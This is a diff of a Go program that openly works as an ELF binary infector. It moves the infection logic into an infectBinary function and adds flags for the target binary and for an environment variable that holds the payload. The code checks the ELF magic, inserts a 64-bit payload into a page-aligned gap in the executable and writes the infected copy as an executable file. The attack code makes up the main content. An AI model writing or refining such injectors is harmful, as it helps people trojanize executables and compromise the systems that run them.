@@ -25,12 +25,13 @@ import (
 	"os"
 	"encoding/binary"
 	"log"
+	"flag"
 )
 
 const (
 	SUCCESS       int    = 0
 	FAILURE       int    = 1
-	x64_PAGE_SIZE uint64 = 4096 //
+	x64_PAGE_SIZE uint64 = 4096 
 	x86_PAGE_SIZE int    = 4096
 	PAGE_SIZE     int    = 4096
 )
@@ -97,29 +98,9 @@ func usage() {
 	os.Exit(FAILURE)
 }
 
-func main() {
-	if len(os.Args) < 2 {
-		usage()
-	}
-	var debug bool = true
 
-	origFile := os.Args[1]
 
-	origFileHandle, err := os.Open(origFile)
-	if err != nil {
-		log.Fatal(err)
-	}
-
-	defer origFileHandle.Close()
-
-	var magic [4]byte
-	origFileHandle.Read(magic[:])
-
-	if !isElf(magic[:4]) {
-		fmt.Println("This is not an Elf binary")
-		return
-	}
-
+func infectBinary(origFileHandle *os.File, pEnv *string, debug bool) {
 	fStat, err := origFileHandle.Stat()
 	if err != nil {
 		fmt.Println(err)
@@ -268,10 +249,40 @@ func main() {
 	}
 	copy(finalInfectionTwo[end_of_infection:], payload64)
 	copy(finalInfectionTwo[end_of_infection+PAGE_SIZE:], finalInfection[end_of_infection:])
-	infectedFileName := fmt.Sprintf("%s-copy", origFile)
+	infectedFileName := fmt.Sprintf("%s-copy", origFileHandle.Name())
 
 	err = ioutil.WriteFile(infectedFileName, finalInfectionTwo, 0751)
 	checkError(err)
 	fmt.Println("finalInfectionTwo cap => ", cap(finalInfectionTwo), "finalInfectionTwo len => ", len(finalInfectionTwo))
 
+}
+
+
+func main() {
+
+	debug := flag.Bool("d", false, "see debug out put (generated payload, modifications, etc)")
+	pEnv := flag.String("e", "DOZEREGG", "name of the environmental variable holding the payload")
+	origFile := flag.String("t", "", "path to binary targetted for infection")
+	flag.Parse()
+
+	if *origFile == "" {
+		log.Fatal("No target binary supplied")
+	}
+
+	origFileHandle, err := os.Open(*origFile)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	defer origFileHandle.Close()
+
+	var magic [4]byte
+	origFileHandle.Read(magic[:])
+
+	if !isElf(magic[:4]) {
+		fmt.Println("This is not an Elf binary")
+		return
+	}
+
+	infectBinary(origFileHandle, pEnv, *debug)
 }
